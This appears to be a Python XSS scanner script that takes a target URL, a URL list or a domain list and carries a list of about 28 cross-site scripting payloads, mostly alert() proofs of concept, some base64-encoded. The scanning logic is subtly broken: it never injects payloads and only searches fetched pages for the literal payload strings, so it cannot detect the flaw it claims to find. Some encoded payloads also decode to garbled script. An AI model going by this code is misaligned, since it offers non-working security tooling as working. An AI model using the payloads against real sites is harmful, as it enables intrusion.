#!/usr/bin/env python3

import sys
import os
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import re
from urllib.parse import urlparse

# Define the payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<embed src='javascript:alert(\"XSS\")'></embed>",
    "<video><source src='javascript:alert(\"XSS\")'></video>",
    "<form action='javascript:alert(\"XSS\")'></form>",
    "<a href='javascript:alert(\"XSS\")'>click</a>",
    "<marquee onstart='alert(\"XSS\")'>test</marquee>",
    "<div onmouseover='alert(\"XSS\")'>hover me</div>",
    "<input onfocus='alert(\"XSS\")'>",
    "<textarea onfocus='alert(\"XSS\")'>text</textarea>",
    "<select onchange='alert(\"XSS\")'><option>test</option></select>",
    "<base href='javascript:alert(\"XSS\")'>",
    "<script>document.write('<img src=x onerror=alert(\"XSS\")>');</script>",
    "<script src='data:text/javascript;base64,dmFyIGFscmVydCA9IGFscmVydCgnWEFTUycpOyBhbGVydCgpOw=='></script>",
    "<img src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICA8Y2lyY2xlIHJ4PSI1MCIgcnk9IjUwIiBmaWxsPSJyZWQiIC8+CiAgPHRleHQgeD0iMTEiIHk9IjE1IiBmaWxsPSJibGFnayI+QWxlcnQoIlhTUyIpPC90ZXh0Pjwvc3ZnPg==' />",
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(\"XSS\")'></svg>",
    "<iframe src='data:text/html;base64,PGJvZHkgb25sb2FkPSJhbGVydCgxKSI+PC9ib2R5Pg=='></iframe>",
    "<iframe src='javascript:eval(atob(\"YWxlcnQoIkFzc2VydCBJcyBub3Qgd29ya2VkIik=\"))'></iframe>",
    "<svg><desc><![CDATA[<script>alert('XSS')</script>]]></desc></svg>",
    "<script src='data:text/javascript;base64,dmFyIGFscmVydCA9IGFscmVydCgxKTsgaGVscG1lbnQoIkdvb2QgQ2FsbCIpOwp2YXIgZG9jdW1lbnQ9ZG9jdW1lbnQoIkdvb2QgQ2FsbCIpOw=='></script>",
    "<a href='javascript:eval(atob(\"YWxlcnQoIkFzc2VydCBJcyBub3Qgd29ya2VkIik=\"))'>test</a>",
    "<iframe srcdoc='<script>alert(\"XSS\")</script>'></iframe>",
    "<img src='javascript:fetch(\"http://example.com/\").then(response => response.text()).then(text => alert(text))'>",
    "<img src='data:image/svg+xml;utf8,<svg/onload=alert(1)></svg>'/>",
    "<iframe src='data:text/html;charset=utf-8,<script>alert(1)</script>'></iframe>",
]

def find_xss_in_html(html_content):
    results = []
    for payload in payloads:
        if payload in html_content:
            results.append(payload)
    return results

def get_valid_links(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for tag in soup.find_all(['a', 'form', 'input', 'textarea', 'select']):
            href = tag.get('href')
            action = tag.get('action')
            if href and urlparse(href).netloc:
                links.add(href)
            if action and urlparse(action).netloc:
                links.add(action)
        return links
    except requests.RequestException as e:
        print(colored(f"Error fetching {url}: {e}", 'red'))
        return set()

def check_xss_on_url(url):
    valid_links = get_valid_links(url)
    for link in valid_links:
        try:
            response = requests.get(link)
            if response.status_code == 200:
                xss_results = find_xss_in_html(response.text)
                for result in xss_results:
                    print(colored(f"Potential XSS payload found in {link}: {result}", 'red'))
        except requests.RequestException as e:
            print(colored(f"Error fetching {link}: {e}", 'red'))

def main():
    if len(sys.argv) < 2:
        print("Usage: TGxss07.py -u <target_url> or TGxss07.py -l <list_of_targets> or TGxss07.py -dL <list_of_domains>")
        sys.exit(1)

    option = sys.argv[1]

    if option == '-u':
        url = sys.argv[2]
        check_xss_on_url(url)
    elif option == '-l':
        list_file = sys.argv[2]
        with open(list_file, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()
                check_xss_on_url(url)
    elif option == '-dL':
        domains_file = sys.argv[2]
        with open(domains_file, 'r') as file:
            domains = file.readlines()
            for domain in domains:
                domain = domain.strip()
                url = f"http://{domain}"
                check_xss_on_url(url)
    else:
        print("Invalid option. Use -u, -l, or -dL.")

if __name__ == "__main__":
    main()
